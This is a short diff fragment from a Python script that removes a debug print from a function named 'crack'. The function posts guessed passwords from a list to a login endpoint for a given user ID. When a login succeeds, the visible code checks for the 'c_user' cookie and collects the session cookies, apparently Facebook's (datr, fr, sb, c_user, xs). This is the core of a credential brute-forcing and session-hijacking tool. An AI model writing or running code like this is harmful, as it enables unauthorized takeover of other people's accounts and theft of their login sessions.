@@ -257,7 +257,6 @@ def crack(uid, password_list, total_count):
             }
             respon = Session.post(url, data=log_data, headers=headers, allow_redirects=False)
             log_cookies = Session.cookies.get_dict().keys()
-            print(log_data)
             # Check response
             if "c_user" in log_cookies:
                 kuki = ";".join([f"{key}={Session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs'] if Session.cookies.get(key)])
